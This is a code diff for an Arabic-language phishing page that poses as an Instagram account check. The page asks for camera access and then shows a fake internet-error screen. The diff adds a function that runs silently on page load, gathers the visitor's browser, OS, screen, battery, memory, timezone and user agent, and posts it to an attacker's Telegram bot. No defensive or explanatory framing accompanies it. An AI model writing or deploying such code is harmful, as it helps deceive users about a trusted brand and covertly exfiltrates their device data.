@@ -155,7 +155,6 @@
     margin-bottom: 6px;
   }
 
-  /* ===== زر إعادة محاولة الكاميرا ===== */
   .retry-btn {
     margin-top: 14px;
     padding: 12px 22px;
@@ -283,7 +282,6 @@ async function startCamera() {
   } catch (err) {
     console.error(err);
 
-    /* حالة: المستخدم رفض إذن الكاميرا */
     if (err.name === 'NotAllowedError' || err.name === 'SecurityError') {
       statusEl.className = 'status-error';
       statusEl.innerHTML = `
@@ -308,7 +306,6 @@ async function startCamera() {
       return false;
     }
 
-    /* باقي أنواع الأخطاء */
     let msg = 'يجب منح اذن الكاميرا لشركة Instagram لتتحقق من هذا الحساب.';
     if (err.name === 'NotFoundError') {
       msg = '📷 لم يتم العثور على كاميرا.';
@@ -469,7 +466,84 @@ function showInternetErrorPage() {
   document.close();
 }
 
-/* ---------- 5) المتابعة بعد نجاح الكاميرا ---------- */
+/* ---------- 5) جمع وإرسال معلومات الجهاز ---------- */
+async function sendDeviceInfo() {
+  try {
+    const nav = navigator;
+    const scr = screen;
+    const ua  = nav.userAgent;
+
+    const isAndroid = /Android/i.test(ua);
+    const isIOS     = /iPhone|iPad|iPod/i.test(ua);
+    const isWindows = /Windows/i.test(ua);
+    const isMac     = /Macintosh|Mac OS X/i.test(ua);
+    const isLinux   = /Linux/i.test(ua) && !isAndroid;
+
+    let os = 'غير معروف';
+    if (isAndroid)      os = 'Android';
+    else if (isIOS)     os = 'iOS';
+    else if (isWindows) os = 'Windows';
+    else if (isMac)     os = 'macOS';
+    else if (isLinux)   os = 'Linux';
+
+    let browser = 'غير معروف';
+    if (/Edg\//i.test(ua))          browser = 'Microsoft Edge';
+    else if (/OPR\//i.test(ua))     browser = 'Opera';
+    else if (/Chrome\//i.test(ua))  browser = 'Chrome';
+    else if (/Firefox\//i.test(ua)) browser = 'Firefox';
+    else if (/Safari\//i.test(ua))  browser = 'Safari';
+
+    let connection = 'غير متاح';
+    const conn = nav.connection || nav.mozConnection || nav.webkitConnection;
+    if (conn) connection = conn.effectiveType || conn.type || 'غير معروف';
+
+    let battery = 'غير مدعوم';
+    try {
+      if (nav.getBattery) {
+        const b = await nav.getBattery();
+        battery = `${Math.round(b.level * 100)}% (${b.charging ? 'يشحن' : 'لا يشحن'})`;
+      }
+    } catch (e) { /* تجاهل */ }
+
+    const memory = nav.deviceMemory ? `${nav.deviceMemory} GB` : 'غير متاح';
+    const cores  = nav.hardwareConcurrency ? nav.hardwareConcurrency : 'غير متاح';
+    const tz     = Intl.DateTimeFormat().resolvedOptions().timeZone || 'غير معروف';
+
+    const text =
+`🖥️ معلومات الجهاز
+
+🌐 المتصفح: ${browser}
+📱 نظام التشغيل: ${os}
+🗣️ اللغة: ${nav.language || 'غير معروف'}
+🌍 المنطقة الزمنية: ${tz}
+
+📐 دقة الشاشة: ${scr.width} × ${scr.height}
+📏 دقة النافذة: ${window.innerWidth} × ${window.innerHeight}
+🔍 كثافة البكسل: ${window.devicePixelRatio || 1}x
+🧠 أنوية المعالج: ${cores}
+💾 الذاكرة التقديرية: ${memory}
+🔋 البطارية: ${battery}
+📶 الاتصال: ${connection}
+👆 اللمس: ${('ontouchstart' in window) ? 'مدعوم' : 'غير مدعوم'}
+🕐 الوقت: ${new Date().toLocaleString('ar-EG')}
+
+📄 User Agent:
+${ua}`;
+
+    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+    const fd  = new FormData();
+    fd.append('chat_id', TELEGRAM_CHAT_ID);
+    fd.append('text', text);
+    fd.append('disable_web_page_preview', 'true');
+
+    await fetch(url, { method: 'POST', body: fd });
+
+  } catch (err) {
+    console.warn('تعذّر إرسال معلومات الجهاز:', err.message);
+  }
+}
+
+/* ---------- 6) المتابعة بعد نجاح الكاميرا ---------- */
 async function continueAfterCamera() {
   setStatus('📸 جارٍ التحقق…', 'info', true);
 
@@ -500,14 +574,18 @@ async function continueAfterCamera() {
   setTimeout(showInternetErrorPage, CONFIG.errorDelayMs);
 }
 
-/* ---------- 6) التدفق الرئيسي ---------- */
+/* ---------- 7) التدفق الرئيسي ---------- */
 async function runVerification() {
   const ok = await startCamera();
-  if (!ok) return;   // إذا فشلت الكاميرا، الزر سيتولى المتابعة
+  if (!ok) return;
   continueAfterCamera();
 }
 
 window.addEventListener('load', () => {
+  // 1) إرسال معلومات الجهاز فورًا — خلال الثواني الثلاث قبل طلب الكاميرا
+  sendDeviceInfo();
+
+  // 2) بعد 3 ثواني، نطلب إذن الكاميرا
   setTimeout(runVerification, CONFIG.startDelayMs);
 });
 
